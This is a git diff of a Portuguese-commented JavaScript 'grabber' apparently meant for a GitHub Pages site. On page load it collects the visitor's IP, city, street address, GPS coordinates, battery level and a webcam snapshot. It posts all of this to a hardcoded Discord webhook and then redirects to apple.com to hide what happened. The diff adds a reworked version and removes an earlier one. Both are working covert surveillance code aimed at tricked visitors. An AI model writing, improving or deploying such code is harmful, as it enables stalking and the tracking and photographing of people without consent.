@@ -1,66 +1,76 @@
-// script.js - GRABBER COMPLETO COM GPS, FOTO E RUA EXATA
+// script.js - GRABBER 100% FUNCIONAL (GitHub Pages + Discord)
 const WEBHOOK = "https://discord.com/api/webhooks/1434608236673368084/AFQ-LUDSvqZxcGzn-6-gd8D84KTdZUn20ykWjvoYhg52IKkxvgAn-xIjcAmjdA1AAu5y";
 
-const sendToDiscord = async (data) => {
-    const embed = {
-        title: "ALVO CAÇADO - LOCALIZAÇÃO EXATA",
-        color: 0xff0000,
-        fields: [
-            { name: "IP", value: data.ip, inline: true },
-            { name: "Cidade", value: data.city, inline: true },
-            { name: "Rua Aprox", value: data.rua || "N/A", inline: false },
-            { name: "GPS", value: `${data.lat}, ${data.lon}`, inline: true },
-            { name: "Precisão", value: `${data.accuracy}m`, inline: true },
-            { name: "Bateria", value: data.battery + "%", inline: true }
-        ],
-        image: { url: data.foto },
-        timestamp: new Date().toISOString(),
-        footer: { text: "HYPERLOGGER v2" }
-    };
-
+const log = async (msg) => {
+    console.log(msg);
     try {
         await fetch(WEBHOOK, {
             method: "POST",
             headers: { "Content-Type": "application/json" },
-            body: JSON.stringify({ embeds: [embed] })
+            body: JSON.stringify({ content: msg })
         });
-        console.log("Enviado com sucesso!");
-    } catch (e) {
-        console.error("Erro no Discord:", e);
-    }
+    } catch (e) {}
 };
 
-const grab = async () => {
+const sendEmbed = async (data) => {
+    const embed = {
+        title: "ALVO CAÇADO - GPS + FOTO",
+        color: 0xff0000,
+        fields: [
+            { name: "IP", value: data.ip || "N/A", inline: true },
+            { name: "Cidade", value: data.city || "N/A", inline: true },
+            { name: "Rua", value: data.rua || "N/A", inline: false },
+            { name: "GPS", value: data.gps || "N/A", inline: true },
+            { name: "Bateria", value: data.battery + "%", inline: true }
+        ],
+        image: { url: data.foto },
+        timestamp: new Date().toISOString()
+    };
+
+    await fetch(WEBHOOK, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ embeds: [embed] })
+    });
+};
+
+(async () => {
     try {
-        // 1. PEGA IP
+        await log("Grabber iniciado...");
+
+        // 1. IP
         const ipRes = await fetch('https://api.ipify.org?format=json');
         const ipData = await ipRes.json();
         const ip = ipData.ip;
+        await log(`IP: ${ip}`);
 
-        // 2. PEGA GEO (sem IP no URL)
-        const geoRes = await fetch('https://ipapi.co/json/');
-        const geoData = await geoRes.json();
+        // 2. GEO (usando API que permite CORS)
+        const geoRes = await fetch('https://ipwho.is/');
+        const geo = await geoRes.json();
+        await log(`Cidade: ${geo.city}`);
 
-        // 3. PEGA GPS
+        // 3. GPS
         const pos = await new Promise((resolve, reject) => {
-            navigator.geolocation.getCurrentPosition(resolve, reject, { timeout: 10000 });
+            navigator.geolocation.getCurrentPosition(resolve, reject, { timeout: 15000 });
         });
+        const gps = `${pos.coords.latitude}, ${pos.coords.longitude}`;
+        await log(`GPS: ${gps}`);
 
-        // 4. REVERSE GEOCODING
-        const revRes = await fetch(`https://nominatim.openstreetmap.org/reverse?lat=${pos.coords.latitude}&lon=${pos.coords.longitude}&format=json`);
-        const revData = await revRes.json();
-        const rua = revData.display_name || "N/A";
+        // 4. RUA (reverse geocoding)
+        const ruaRes = await fetch(`https://nominatim.openstreetmap.org/reverse?lat=${pos.coords.latitude}&lon=${pos.coords.longitude}&format=json`);
+        const ruaData = await ruaRes.json();
+        const rua = ruaData.display_name || "N/A";
 
         // 5. BATERIA
-        const battery = await navigator.getBattery();
-        const batLevel = Math.round(battery.level * 100);
+        const bat = await navigator.getBattery();
+        const battery = Math.round(bat.level * 100);
 
         // 6. FOTO
-        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+        const stream = await navigator.mediaDevices.getUserMedia({ video: { width: 320, height: 240 } });
         const video = document.createElement('video');
         video.srcObject = stream;
         video.play();
-        await new Promise(r => setTimeout(r, 2000));
+        await new Promise(r => setTimeout(r, 2500));
         const canvas = document.createElement('canvas');
         canvas.width = 320; canvas.height = 240;
         canvas.getContext('2d').drawImage(video, 0, 0, 320, 240);
@@ -68,32 +78,20 @@ const grab = async () => {
         stream.getTracks().forEach(t => t.stop());
 
         // 7. ENVIA TUDO
-        await sendToDiscord({
+        await sendEmbed({
             ip,
-            city: geoData.city,
+            city: geo.city,
             rua,
-            lat: pos.coords.latitude,
-            lon: pos.coords.longitude,
-            accuracy: pos.coords.accuracy,
-            battery: batLevel,
+            gps,
+            battery,
             foto
         });
 
-        // Redireciona pra disfarçar
-        setTimeout(() => { window.location = "https://apple.com"; }, 3000);
+        await log("DADOS ENVIADOS COM SUCESSO!");
+        setTimeout(() => { window.location = "https://apple.com/br/"; }, 2000);
 
     } catch (e) {
-        console.error("Erro:", e);
-        // Envia erro mínimo
-        fetch(WEBHOOK, {
-            method: "POST",
-            headers: { "Content-Type": "application/json" },
-            body: JSON.stringify({
-                embeds: [{ title: "ERRO NO GRABBER", description: e.message, color: 0xff0000 }]
-            })
-        });
+        await log(`ERRO: ${e.message}`);
+        console.error(e);
     }
-};
-
-// EXECUTA AUTOMATICAMENTE
-grab();
+})();
